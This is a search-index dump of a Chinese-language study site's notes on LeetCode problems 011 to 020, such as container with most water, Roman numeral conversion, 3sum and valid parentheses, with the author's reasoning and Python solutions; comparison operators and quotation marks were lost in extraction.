\u611f\u89c9dp\u4e0d\u884c \u4e8c\u5206 \u4e24\u7aef\u5411\u4e2d\u5fc3\u641c\u7d22\uff1f \u9047\u5230\u5bb9\u79ef\u53d8\u5c11\u5c31\u662f\u6700\u5927\uff1f \u53cd\u4f8b 1 8 8 8 9 1 5- 4 \u6700\u592716 \u8ba1\u7b97\u5dee\u503c\uff0c\u7b26\u5408\u6761\u4ef6\u5c31\u79fb\u52a8\uff1f \u5bb9\u79ef\u53d6\u51b3\u4e8eheight[i],i min(height[i],height[j])*(j-i) \u8fd9\u91cc\u5047\u8bbej\u4e0d\u53d8 \u5982\u679c \u6162\u7740\u600e\u4e48\u611f\u89c9\u53c8\u8dd1\u5230\u4e4b\u524d\u7684\u60f3\u6cd5\u4e86 height[i+1]-height[i] abs(j-(i+i)? \u6216\u8005\u76f4\u63a5\u904d\u5386\uff1f \u6cd5\u4e00 \u91c7\u7528\u4e24\u4e2a\u6307\u9488l\u548cr\uff0c\u521d\u59cb\u5316\u5206\u522b\u6307\u5411\u6570\u7ec4\u7684\u4e24\u7aef\uff0c \u7136\u540e\u5728\u5411\u4e2d\u95f4\u79fb\u52a8\u627e\u5230\u6700\u5927\u5bb9\u91cf\u3002 \u5982\u679cl\u6307\u5411\u7684\u6570\u5b57\u5c0f\uff0c\u5219l\u9700\u8981\u53f3\u79fb\u624d\u6709\u53ef\u80fd\u83b7\u5f97\u66f4\u5927\u5bb9\u91cf\uff0c \u56e0\u4e3a\u6b64\u65f6\u5982\u679c\u5de6\u79fbr\uff0c\u5f97\u5230\u7684\u5bb9\u91cf\u80af\u5b9a\u6bd4\u5de6\u79fbr\u4e4b\u524d\u7684\u5bb9\u91cf\u5c0f \uff08\u9ad8\u5ea6\u5df2\u7ecf\u88ab\u8f83\u5c0f\u7684l\u9650\u5236\u4f4f\u4e86\uff09\u3002 \u5982\u679cr\u6307\u5411\u7684\u6570\u5b57\u5c0f\uff0c\u5219\u9700\u8981\u5de6\u79fbr\u3002 \u8fd9\u6837\uff0c\u5f53l\u548cr\u76f8\u9047\u7684\u65f6\u5019\uff0c\u6700\u5927\u7684\u5bb9\u91cf\u5c31\u662f\u6211\u4eec\u9700\u8981\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def maxArea ( self , height ): :type height: List[int] :rtype: int MAX = 0 right = len ( height ) - 1 left = 0 while right != left : if height [ right ] height [ left ]: area = height [ left ] * ( right - left ) left += 1 else : area = height [ right ] * ( right - left ) right -= 1 MAX = max ( MAX , area ) return MAX 012 int\u53d8\u4e3a\u7f57\u9a6c\u6570\u5b57 \u67e5\u8868\u5c31\u884c\u4e86 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Solution : def intToRoman ( self , num ): :type num: int :rtype: str M = [ , M , MM , MMM ] C = [ , C , CC , CCC , CD , D , DC , DCC , DCCC , CM ] X = [ , X , XX , XXX , XL , L , LX , LXX , LXXX , XC ] I = [ , I , II , III , IV , V , VI , VII , VIII , IX ] return M [ num // 1000 ] + \\ C [( num % 1000 ) // 100 ] + \\ X [( num % 100 ) // 10 ] + \\ I [ num % 10 ] 013 \u7f57\u9a6c\u6570\u5b57\u53d8\u4e3aint 1 to 3999 \u4ece\u540e\u5f80\u524d\u6570\u5457 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution : def romanToInt ( self , s ): :type s: str :rtype: int dic = { I : 1 , V : 5 , X : 10 , L : 50 , C : 100 , D : 500 , M : 1000 } res = dic [ s [ - 1 ]] for i in range ( len ( s ) - 2 , - 1 , - 1 ): if dic [ s [ i ]] dic [ s [ i + 1 ]]: res -= dic [ s [ i ]] else : res += dic [ s [ i ]] return res \u5176\u4ed6 \u67e5\u8868\u7684\u65b9\u5f0f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 class Solution ( object ): def romanToInt ( self , s ): :type s: str :rtype: int sym_to_num = { I : 1 , V : 5 , X : 10 , L : 50 , C : 100 , D : 500 , M : 1000 } special = { IV : 4 , IX : 9 , XL : 40 , XC : 90 , CD : 400 , CM : 900 } i = 0 res = 0 l = len ( s ) while i l : # \u6bcf\u6b21\u5f80\u524d\u68c0\u67e5\u4e00\u4e0b\u6709\u6ca1\u6709\u7279\u6b8a\u7684\u6570\u5b57 if i + 1 l and s [ i : i + 2 ] in special : res += special [ s [ i : i + 2 ]] i += 2 else : res += sym_to_num [ s [ i ]] i += 1 return res 014 \u8fd4\u56de\u4e00\u7ec4\u5b57\u7b26\u4e32\u7684\u6700\u957f\u7684\u516c\u5171\u524d\u7f00 1 2 3 4 5 6 Input: [ flower , flow , flight ] Output: fl Input: [ dog , racecar , car ] Output: Explanation: There is no common prefix among the input strings. \u60f3\u6cd5 DP\uff1f \u5f02\u6216\uff1f python\u4e0d\u652f\u6301\u5b57\u7b26\u4e32\u7684\u5f02\u6216 \u5148\u66b4\u529b\u8bd5\u8bd5\u5427 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Solution : def longestCommonPrefix ( self , strs ): :type strs: List[str] :rtype: str if len ( strs ) == 0 : return ans = for i in range ( len ( strs [ 0 ])): # char = strs[0][i] for j in range ( len ( strs )): if i = len ( strs [ j ]) or strs [ 0 ][ i ] != strs [ j ][ i ]: return ans ans += strs [ 0 ][ i ] return ans 015 \u5bf9\u4e8e\u7ed9\u5b9a\u7684\u6570\u7ec4\uff0c\u5224\u65ad\u662f\u5426\u67093\u4e2a\u6570\u76f8\u52a0\u4e3a0\uff0c\u8fd4\u56de\u6240\u6709\u7684\u89e3 \u60f3\u6cd5 \u5b58\u50a8 set \u4f7f\u75282sum\u7684\u601d\u60f3\uff1fhash\u8868\u6765\u5b58\u50a8\u7b49\u4e8e\u96f6\u7684\u6570\u5b57\uff1f \u4e0d\u5bf9\uff0c\u8fd9\u6837\u5c31\u662f\u66b4\u529b\u7684\u505a\u6cd5 \u90a3\u5c31\u66b4\u529b\u8bd5\u8bd5\u5427\uff0c\u7528\u4e24\u4e2adic\u6765\u505a \u6392\u4e2a\u5e8f\u4f1a\u66f4\u597d\uff1f \u5148\u66b4\u529b\u8bd5\u8bd5\uff0c\u4e0d\u8fc7\u90a3\u4e5f\u662f n^3 n^3 \u7684\u590d\u6742\u5ea6 \u6cd5\u4e00 \u6700\u540e\u8fd8\u662f\u75282sum\u7684\u601d\u60f3\u6765\u66b4\u529b\u4e00\u6b21 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Solution : def threeSum ( self , nums ): :type nums: List[int] :rtype: List[List[int]] if len ( nums ) 3 : return [] nums . sort () threeSumSet = set () for i , num in enumerate ( nums [: - 2 ]): # \u5bf9\u4e8e\u6bcf\u4e2a\u6570\u5b57\uff0c\u56fa\u5b9a\u4f4f\uff0c\u5efa\u4e00\u4e2a\u8868\u6765\u5b58\u50a8\u5dee\u503c # \u4e0d\u8fc7\u672c\u8eab\u5c31\u662f-num\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\uff1f d = {} for j , nextNum in enumerate ( nums [ i + 1 :]): diff = - num - nextNum if diff in d : threeSumSet . add (( num , nextNum , - nextNum - num )) d [ nextNum ] = j res = [] for single_and in threeSumSet : res . append ( list ( single_and )) return res \u5176\u4ed6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class Solution : def threeSum ( self , nums ): :type nums: List[int] :rtype: List[List[int]] if len ( nums ) 3 : return [] threeSum_set = set () nums . sort () for i , v in enumerate ( nums [: - 2 ]): if i = 1 and v == nums [ i - 1 ]: continue d = {} for j in nums [ i + 1 :]: if j not in d : d [ - v - j ] = 1 else : threeSum_set . add (( v , - v - j , j )) res = [] for single_ans in threeSum_set : res . append ( list ( single_ans )) return res 016 \u7ed9\u5b9an\u4e2a\u6574\u6570\u548c\u6574\u6570\u76ee\u6807\u7684\u6570\u7ec4nums\uff0c\u5728nums\u4e2d\u627e\u5230\u4e09\u4e2a\u6574\u6570\uff0c\u4f7f\u5f97\u603b\u548c\u6700\u63a5\u8fd1\u76ee\u6807\u3002 \u8fd4\u56de\u603b\u548c \u60f3\u6cd5 3sum\u7684\u53d8\u79cd\uff0c\u6240\u4ee5\u8fd8\u662f\u4f7f\u7528\u5b57\u5178\u6765\u5b58\u50a8 key \u6570\u5b57num value \u4f7f\u75283sum\u7684\u601d\u60f3\uff0c\u5efa\u7acb\u4e00\u5b57\u5178\uff0c\u7136\u540e\u5f80\u540e\u904d\u5386\u67e5\u627e \u641c\u7d22\u4e4b\uff0c\u5de6\u79fb\u53f3\u79fb\uff1f diff = target - num - (nums[left]+nums[right]) diff\u5c0f\u4e8e\u96f6 \u9700\u8981\u67e5\u627e\u5f97\u503c\u53d8\u5c0f nums[right] down diff\u5927\u4e8e\u96f6 \u9700\u8981\u67e5\u627e\u5f97\u503c\u53d8\u5927 nums[left] ascend \u76f4\u5230 left =right diff = 0 abs(diff)\u6700\u5c0f\uff0c\u5f53abs(diff)\u53d8\u5927\u65f6\u7ed3\u675f\u5faa\u73af\uff1f -1 -1 2 3 4 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Solution : def threeSumClosest ( self , nums , target ): :type nums: List[int] :type target: int :rtype: int if len ( nums ) = 3 : return sum ( nums ) closest = nums [ 0 ] + nums [ 1 ] + nums [ 2 ] nums . sort () distance = abs ( closest - target ) for i in range ( len ( nums ) - 2 ): left = i + 1 right = len ( nums ) - 1 while left right : new_nums_sum = nums [ i ] + nums [ left ] + nums [ right ] current_distance = abs ( new_nums_sum - target ) if current_distance = distance : distance = current_distance closest = new_nums_sum if new_nums_sum target : left += 1 else : right -= 1 return closest \u7591\u95ee \u4e0b\u9762\u4ee3\u7801\u54ea\u91cc\u51fa\u9519\u4e86\u5462\uff1f \u601d\u8def\u662f\u4e00\u81f4\u7684 \u6ce8\u610f\u7f29\u8fdb\uff01\uff01\uff01\uff01 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class Solution : def threeSumClosest ( self , nums , target ): :type nums: List[int] :type target: int :rtype: int nums . sort () record_diff = float ( inf ) for i , currentNum in enumerate ( nums [: - 2 ]): left = i + 1 right = len ( nums ) - 1 while left right : if currentNum + nums [ left ] + nums [ right ] == target : return target diff = ( currentNum + nums [ left ] + nums [ right ]) - target if abs ( diff ) abs ( record_diff ): record_diff = diff if diff 0 : right = right - 1 else : left = left + 1 return target + record_diff 017 \u7ed9\u5b9a\u4e00\u4e2a\u5305\u542b2-9\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u624b\u673a\u952e\u76d8\u53ef\u80fd\u51fa\u73b0\u7684\u5b57\u7b26 \u611f\u89c9\u4f7f\u7528python\u672c\u8eab\u7684\u6027\u8d28\u5c31\u53ef\u4ee5\u6c42\u5f97\u4e86\uff0c\u4f46\u662f\u6700\u597d\u8fd8\u662f\u4f7f\u7528c\u7684\u601d\u60f3 \u4e00\u5f00\u59cb\u65e0\u6cd5\u786e\u5b9a\u5faa\u73af\u4e2a\u6570\uff0c\u5faa\u73af\u957f\u5ea6 \u7a77\u4e3e\u54af\uff0c\u56de\u6eaf\u54af \u6cd5\u4e00 \u611f\u89c9\u8fd8\u662f\u5bf9\u9012\u5f52\u4e0d\u719f\u6089 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 class Solution ( object ): def letterCombinations ( self , digits ): type digits: str rtype: list[str] def dfs ( num , string , res ): if num == length : res . append ( string ) return for letter in dict [ digits [ num ]]: dfs ( num + 1 , string + letter , res ) dict = { 2 : [ a , b , c ], 3 : [ d , e , f ], 4 : [ g , h , i ], 5 : [ j , k , l ], 6 : [ m , n , o ], 7 : [ p , q , r , s ], 8 : [ t , u , v ], 9 : [ w , x , y , z ] } res = [] length = len ( digits ) if length == 0 : return [] dfs ( 0 , , res ) return res for i in Solution () . letterCombinations ( 2352 ): print ( i ) \u5176\u4ed6 1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution : def letterCombinations ( self , digits ): :type digits: str :rtype: List[str] if len ( digits ) == 0 : return [] num_to_char = { 2 : abc , 3 : def , 4 : ghi , 5 : jkl , 6 : mno , 7 : pqrs , 8 : tuv , 9 : wxyz } res = [ i for i in num_to_char [ digits [ 0 ]]] for i in digits [ 1 :]: res = [ m + n for m in res for n in num_to_char [ i ]] return res 018 \u7ed9\u5b9a\u4e00\u4e2atarget\uff0c\u4f7f\u75284\u4e2a\u6570\u5b57\u62fc\u51d1\u5b83 4sum \u6cd5\u4e00 \u6211\u5e72\u8106\u8bd5\u8bd53sum closet\u7b97\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class Solution : def fourSum ( self , nums , target ): :type nums: List[int] :type target: int :rtype: List[List[int]] nums . sort () res = [] for i in range ( len ( nums ) - 3 ): for j in range ( i + 1 , len ( nums ) - 2 ): start = j + 1 end = len ( nums ) - 1 while start end : value = nums [ i ] + nums [ j ] + nums [ start ] + nums [ end ] if value == target : res . append ([ nums [ i ], nums [ j ], nums [ start ], nums [ end ]]) start += 1 elif value target : start += 1 elif value target : end -= 1 res = list ( set ([ tuple ( t ) for t in res ])) res = [ list ( v ) for v in res ] return res \u5176\u4ed6 Todo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 class Solution : def fourSum ( self , nums , target ): :type nums: List[int] :type target: int :rtype: List[List[int]] def findNsum ( nums , target , N , result , results ): if N 2 or len ( nums ) N or nums [ 0 ] * N target or nums [ - 1 ] * N target : return if N == 2 : l = 0 r = len ( nums ) - 1 while l r : s = nums [ l ] + nums [ r ] if s == target : results . append ( result + [ nums [ l ], nums [ r ]]) l += 1 r -= 1 while l r and nums [ l ] == nums [ l - 1 ]: l += 1 while l r and nums [ r ] == nums [ r + 1 ]: r -= 1 elif s target : l += 1 else : r -= 1 else : for i in range ( len ( nums ) - N + 1 ): if i == 0 or ( i 0 and nums [ i ] != nums [ i - 1 ]): findNsum ( nums [ i + 1 ::], target - nums [ i ], N - 1 , result + [ nums [ i ]], results ) results = [] result = [] findNsum ( sorted ( nums ), target , 4 , result , results ) return results 019 \u7ed9\u5b9a\u4ee5\u4e2a\u5355\u94fe\u8868\uff0c\u79fb\u9664\u5012\u6570\u7b2cn\u4e2a\u8282\u70b9 \u5148\u66b4\u529b\u8bd5\u8bd5 \u6709\u4e00\u4e9b\u8fb9\u754c\u6761\u4ef6 \u5012\u6570\u7b2cn\u4e2a\u8282\u70b9\u662fhead\u8282\u70b9 \u5012\u6570\u7b2cn\u4e2a\u8282\u70b9\u662f\u5c3e\u8282\u70b9 \u6cd5\u4e00 \u76f4\u63a5\u66b4\u529b\u4e0a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def removeNthFromEnd ( self , head , n ): :type head: ListNode :type n: int :rtype: ListNode p = head record = [] while p != None : record . append ( p ) p = p . next if len ( record ) == 1 : del ( head ) return None if len ( record ) == n : return record [ 1 ] left = record [ - n - 1 ] left . next = left . next . next record [ - n ] . next = None del ( record [ - n ]) return head \u5176\u4ed6 \u8fd9\u4e2a\u65b9\u5f0f\u6bd4\u66b4\u529b\u7684\u65b9\u5f0f\u806a\u660e\u591a\u4e86 \u9996\u5148right\u5148\u8d70n\u6b65\uff0c\u7136\u540eleft\u5f00\u59cb\u8ba1\u7b97 \u63a5\u7740\u904d\u5386\u4e4b\uff0c\u5982\u679cright\u8d70\u5b8c\u4e86\uff0c\u90a3\u4e48left\u521a\u597d\u5230\u8fbe\u5012\u6570\u7b2cn\u4e2a\u8282\u70b9 \u56e0\u4e3aright\u4e0eleft\u76f8\u5deen\u4e2a\u8282\u70b9\uff0cright\u8d70\u5b8c\u4e86\uff0c\u90a3\u4e48left\u79bb\u5b8c\u6210\u904d\u5386\u8fd8\u6709n\u4e2a\u8282\u70b9\uff0c\u6240\u4ee5\u662f\u5012\u6570\u7b2cn\u4e2a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 class Solution : def removeNthFromEnd ( self , head , n ): :type head: ListNode :type n: int :rtype: ListNode p = head right = p while n 0 : n -= 1 right = right . next left = head if not right : head = head . next return head while right and right . next : right = right . next left = left . next left . next = left . next . next return head 020 \u5224\u65ad\u4e00\u4e2a\u5de6\u53f3\u62ec\u53f7\u662f\u5426\u662f\u5408\u6cd5\u7684 \u611f\u89c9\u4f7f\u7528stack\uff1f \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def isValid ( self , s ): :type s: str :rtype: bool stack = [] left = [ ( , [ , { ] for i in range ( len ( s )): if s [ i ] in left : stack . append ( s [ i ]) continue elif s [ i ] == ) : if len ( stack ) == 0 or stack . pop () != ( : return False elif s [ i ] == ] : if len ( stack ) == 0 or stack . pop () != [ : return False elif s [ i ] == } : if len ( stack ) == 0 or stack . pop () != { : return False return len ( stack ) == 0","title":"011 020"},{"location":"LeetCode/vol 0/011-020/#011","text":"\u6839\u636e\u6240\u7ed9\u7684\u6570\u503c\uff0c\u8fd4\u56de\u6309\u7167\u8fd9\u4e2a\u6570\u503c\u6240\u6784\u6210\u7684\u6700\u591a\u7684\u5bb9\u5668\u7684\u5bb9\u79ef \u8b6c\u5982\u4e0a\u56fe 7 \\times 8=56 7 \\times 8=56 \u60f3\u6cd5 \u5f97\u5230\u5bb9\u79ef\u9700\u8981\u4e24\u4e2a\u503c\uff0c\u66b4\u529b\u7684\u505a\u6cd5\u662f\u904d\u5386 1 2 3 4 5 6 7 8 9 10 11 12 class Solution : def maxArea ( self , height ): :type height: List[int] :rtype: int res = 0 for i in range ( len ( height )): for j in range ( i + 1 , len ( height )): tmp = min ( height [ i ], height [ j ]) * ( j - i ) res = max ( res , tmp ) return res \u60f3\u8981\u806a\u660e\u4e00\u70b9\u5f97\u5230\u5bb9\u5668\u7684\u5bb9\u79ef\u9700\u8981 DP\uff1f \u90a3\u4e48\u5982\u4f55\u8bb0\u5f55\u503c\u5462\uff1f\u72b6\u6001\u751f\u6210\u5f0f\u662f\uff1f dp[]? dp[i]\u4e0e\u5176\u5339\u914d\u7684\u5750\u6807\uff1f- \u5982\u4f55\u8ba1\u7b97\uff0c min(height[i],height[dp[i-1]])*abs(i-dp[i-1]),? \u611f\u89c9dp\u4e0d\u884c \u4e8c\u5206 \u4e24\u7aef\u5411\u4e2d\u5fc3\u641c\u7d22\uff1f \u9047\u5230\u5bb9\u79ef\u53d8\u5c11\u5c31\u662f\u6700\u5927\uff1f \u53cd\u4f8b 1 8 8 8 9 1 5- 4 \u6700\u592716 \u8ba1\u7b97\u5dee\u503c\uff0c\u7b26\u5408\u6761\u4ef6\u5c31\u79fb\u52a8\uff1f \u5bb9\u79ef\u53d6\u51b3\u4e8eheight[i],i min(height[i],height[j])*(j-i) \u8fd9\u91cc\u5047\u8bbej\u4e0d\u53d8 \u5982\u679c \u6162\u7740\u600e\u4e48\u611f\u89c9\u53c8\u8dd1\u5230\u4e4b\u524d\u7684\u60f3\u6cd5\u4e86 height[i+1]-height[i] abs(j-(i+i)? \u6216\u8005\u76f4\u63a5\u904d\u5386\uff1f","title":"011"},{"location":"LeetCode/vol 0/011-020/#_1","text":"\u91c7\u7528\u4e24\u4e2a\u6307\u9488l\u548cr\uff0c\u521d\u59cb\u5316\u5206\u522b\u6307\u5411\u6570\u7ec4\u7684\u4e24\u7aef\uff0c \u7136\u540e\u5728\u5411\u4e2d\u95f4\u79fb\u52a8\u627e\u5230\u6700\u5927\u5bb9\u91cf\u3002 \u5982\u679cl\u6307\u5411\u7684\u6570\u5b57\u5c0f\uff0c\u5219l\u9700\u8981\u53f3\u79fb\u624d\u6709\u53ef\u80fd\u83b7\u5f97\u66f4\u5927\u5bb9\u91cf\uff0c \u56e0\u4e3a\u6b64\u65f6\u5982\u679c\u5de6\u79fbr\uff0c\u5f97\u5230\u7684\u5bb9\u91cf\u80af\u5b9a\u6bd4\u5de6\u79fbr\u4e4b\u524d\u7684\u5bb9\u91cf\u5c0f \uff08\u9ad8\u5ea6\u5df2\u7ecf\u88ab\u8f83\u5c0f\u7684l\u9650\u5236\u4f4f\u4e86\uff09\u3002 \u5982\u679cr\u6307\u5411\u7684\u6570\u5b57\u5c0f\uff0c\u5219\u9700\u8981\u5de6\u79fbr\u3002 \u8fd9\u6837\uff0c\u5f53l\u548cr\u76f8\u9047\u7684\u65f6\u5019\uff0c\u6700\u5927\u7684\u5bb9\u91cf\u5c31\u662f\u6211\u4eec\u9700\u8981\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def maxArea ( self , height ): :type height: List[int] :rtype: int MAX = 0 right = len ( height ) - 1 left = 0 while right != left : if height [ right ] height [ left ]: area = height [ left ] * ( right - left ) left += 1 else : area = height [ right ] * ( right - left ) right -= 1 MAX = max ( MAX , area ) return MAX","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/011-020/#012","text":"int\u53d8\u4e3a\u7f57\u9a6c\u6570\u5b57 \u67e5\u8868\u5c31\u884c\u4e86","title":"012"},{"location":"LeetCode/vol 0/011-020/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Solution : def intToRoman ( self , num ): :type num: int :rtype: str M = [ , M , MM , MMM ] C = [ , C , CC , CCC , CD , D , DC , DCC , DCCC , CM ] X = [ , X , XX , XXX , XL , L , LX , LXX , LXXX , XC ] I = [ , I , II , III , IV , V , VI , VII , VIII , IX ] return M [ num // 1000 ] + \\ C [( num % 1000 ) // 100 ] + \\ X [( num % 100 ) // 10 ] + \\ I [ num % 10 ]","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/011-020/#013","text":"\u7f57\u9a6c\u6570\u5b57\u53d8\u4e3aint 1 to 3999 \u4ece\u540e\u5f80\u524d\u6570\u5457","title":"013"},{"location":"LeetCode/vol 0/011-020/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution : def romanToInt ( self , s ): :type s: str :rtype: int dic = { I : 1 , V : 5 , X : 10 , L : 50 , C : 100 , D : 500 , M : 1000 } res = dic [ s [ - 1 ]] for i in range ( len ( s ) - 2 , - 1 , - 1 ): if dic [ s [ i ]] dic [ s [ i + 1 ]]: res -= dic [ s [ i ]] else : res += dic [ s [ i ]] return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/011-020/#_4","text":"\u67e5\u8868\u7684\u65b9\u5f0f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 class Solution ( object ): def romanToInt ( self , s ): :type s: str :rtype: int sym_to_num = { I : 1 , V : 5 , X : 10 , L : 50 , C : 100 , D : 500 , M : 1000 } special = { IV : 4 , IX : 9 , XL : 40 , XC : 90 , CD : 400 , CM : 900 } i = 0 res = 0 l = len ( s ) while i l : # \u6bcf\u6b21\u5f80\u524d\u68c0\u67e5\u4e00\u4e0b\u6709\u6ca1\u6709\u7279\u6b8a\u7684\u6570\u5b57 if i + 1 l and s [ i : i + 2 ] in special : res += special [ s [ i : i + 2 ]] i += 2 else : res += sym_to_num [ s [ i ]] i += 1 return res","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 0/011-020/#014","text":"\u8fd4\u56de\u4e00\u7ec4\u5b57\u7b26\u4e32\u7684\u6700\u957f\u7684\u516c\u5171\u524d\u7f00 1 2 3 4 5 6 Input: [ flower , flow , flight ] Output: fl Input: [ dog , racecar , car ] Output: Explanation: There is no common prefix among the input strings. \u60f3\u6cd5 DP\uff1f \u5f02\u6216\uff1f python\u4e0d\u652f\u6301\u5b57\u7b26\u4e32\u7684\u5f02\u6216 \u5148\u66b4\u529b\u8bd5\u8bd5\u5427","title":"014"},{"location":"LeetCode/vol 0/011-020/#_5","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Solution : def longestCommonPrefix ( self , strs ): :type strs: List[str] :rtype: str if len ( strs ) == 0 : return ans = for i in range ( len ( strs [ 0 ])): # char = strs[0][i] for j in range ( len ( strs )): if i = len ( strs [ j ]) or strs [ 0 ][ i ] != strs [ j ][ i ]: return ans ans += strs [ 0 ][ i ] return ans","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/011-020/#015","text":"\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u6570\u7ec4\uff0c\u5224\u65ad\u662f\u5426\u67093\u4e2a\u6570\u76f8\u52a0\u4e3a0\uff0c\u8fd4\u56de\u6240\u6709\u7684\u89e3 \u60f3\u6cd5 \u5b58\u50a8 set \u4f7f\u75282sum\u7684\u601d\u60f3\uff1fhash\u8868\u6765\u5b58\u50a8\u7b49\u4e8e\u96f6\u7684\u6570\u5b57\uff1f \u4e0d\u5bf9\uff0c\u8fd9\u6837\u5c31\u662f\u66b4\u529b\u7684\u505a\u6cd5 \u90a3\u5c31\u66b4\u529b\u8bd5\u8bd5\u5427\uff0c\u7528\u4e24\u4e2adic\u6765\u505a \u6392\u4e2a\u5e8f\u4f1a\u66f4\u597d\uff1f \u5148\u66b4\u529b\u8bd5\u8bd5\uff0c\u4e0d\u8fc7\u90a3\u4e5f\u662f n^3 n^3 \u7684\u590d\u6742\u5ea6","title":"015"},{"location":"LeetCode/vol 0/011-020/#_6","text":"\u6700\u540e\u8fd8\u662f\u75282sum\u7684\u601d\u60f3\u6765\u66b4\u529b\u4e00\u6b21 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Solution : def threeSum ( self , nums ): :type nums: List[int] :rtype: List[List[int]] if len ( nums ) 3 : return [] nums . sort () threeSumSet = set () for i , num in enumerate ( nums [: - 2 ]): # \u5bf9\u4e8e\u6bcf\u4e2a\u6570\u5b57\uff0c\u56fa\u5b9a\u4f4f\uff0c\u5efa\u4e00\u4e2a\u8868\u6765\u5b58\u50a8\u5dee\u503c # \u4e0d\u8fc7\u672c\u8eab\u5c31\u662f-num\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\uff1f d = {} for j , nextNum in enumerate ( nums [ i + 1 :]): diff = - num - nextNum if diff in d : threeSumSet . add (( num , nextNum , - nextNum - num )) d [ nextNum ] = j res = [] for single_and in threeSumSet : res . append ( list ( single_and )) return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/011-020/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class Solution : def threeSum ( self , nums ): :type nums: List[int] :rtype: List[List[int]] if len ( nums ) 3 : return [] threeSum_set = set () nums . sort () for i , v in enumerate ( nums [: - 2 ]): if i = 1 and v == nums [ i - 1 ]: continue d = {} for j in nums [ i + 1 :]: if j not in d : d [ - v - j ] = 1 else : threeSum_set . add (( v , - v - j , j )) res = [] for single_ans in threeSum_set : res . append ( list ( single_ans )) return res","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 0/011-020/#016","text":"\u7ed9\u5b9an\u4e2a\u6574\u6570\u548c\u6574\u6570\u76ee\u6807\u7684\u6570\u7ec4nums\uff0c\u5728nums\u4e2d\u627e\u5230\u4e09\u4e2a\u6574\u6570\uff0c\u4f7f\u5f97\u603b\u548c\u6700\u63a5\u8fd1\u76ee\u6807\u3002 \u8fd4\u56de\u603b\u548c \u60f3\u6cd5 3sum\u7684\u53d8\u79cd\uff0c\u6240\u4ee5\u8fd8\u662f\u4f7f\u7528\u5b57\u5178\u6765\u5b58\u50a8 key \u6570\u5b57num value \u4f7f\u75283sum\u7684\u601d\u60f3\uff0c\u5efa\u7acb\u4e00\u5b57\u5178\uff0c\u7136\u540e\u5f80\u540e\u904d\u5386\u67e5\u627e \u641c\u7d22\u4e4b\uff0c\u5de6\u79fb\u53f3\u79fb\uff1f diff = target - num - (nums[left]+nums[right]) diff\u5c0f\u4e8e\u96f6 \u9700\u8981\u67e5\u627e\u5f97\u503c\u53d8\u5c0f nums[right] down diff\u5927\u4e8e\u96f6 \u9700\u8981\u67e5\u627e\u5f97\u503c\u53d8\u5927 nums[left] ascend \u76f4\u5230 left =right diff = 0 abs(diff)\u6700\u5c0f\uff0c\u5f53abs(diff)\u53d8\u5927\u65f6\u7ed3\u675f\u5faa\u73af\uff1f -1 -1 2 3 4","title":"016"},{"location":"LeetCode/vol 0/011-020/#_8","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Solution : def threeSumClosest ( self , nums , target ): :type nums: List[int] :type target: int :rtype: int if len ( nums ) = 3 : return sum ( nums ) closest = nums [ 0 ] + nums [ 1 ] + nums [ 2 ] nums . sort () distance = abs ( closest - target ) for i in range ( len ( nums ) - 2 ): left = i + 1 right = len ( nums ) - 1 while left right : new_nums_sum = nums [ i ] + nums [ left ] + nums [ right ] current_distance = abs ( new_nums_sum - target ) if current_distance = distance : distance = current_distance closest = new_nums_sum if new_nums_sum target : left += 1 else : right -= 1 return closest","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/011-020/#_9","text":"\u4e0b\u9762\u4ee3\u7801\u54ea\u91cc\u51fa\u9519\u4e86\u5462\uff1f \u601d\u8def\u662f\u4e00\u81f4\u7684 